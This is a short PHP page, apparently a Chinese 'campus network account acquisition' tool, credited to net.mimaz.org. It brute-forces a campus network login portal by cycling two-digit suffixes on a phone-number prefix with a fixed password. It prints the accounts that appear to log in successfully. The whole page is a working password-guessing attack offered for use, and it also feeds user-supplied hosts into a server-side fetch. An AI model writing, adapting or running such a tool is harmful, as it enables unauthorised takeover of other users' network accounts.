<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8">
		<title>校园网账号 获取系统</title>
	</head>
	<body>
		<?php
		$phonenum = $_POST['phone'];
		$four = $_POST['four'];
		$password = $_POST['password'];
		$ip = $_POST['ip'];
		echo '<h1>可用账号将在下方显示</h1>';
		echo ' 密码站 - 生态应用链  Find By <a href="http://net.mimaz.org">net.mimaz.org</a></br></br></br>';
		while ($four < 99) {
			if (strlen($four) == 1)
				$four = "0" . $four;
			$one = $phonenum . $four;
			$url = 'http://' . $ip . ':8800/index.php?action=login&ts=login&username=' . $one . '&password=' . $password;
			$html = file_get_contents($url);

			if ($html % 101 == 0) {
				echo '账号:';
				echo $phonenum . $four . '@deep     密码:' . $password . '</br>';
			}
			$four++;
		}
	?>
	</body>
</html>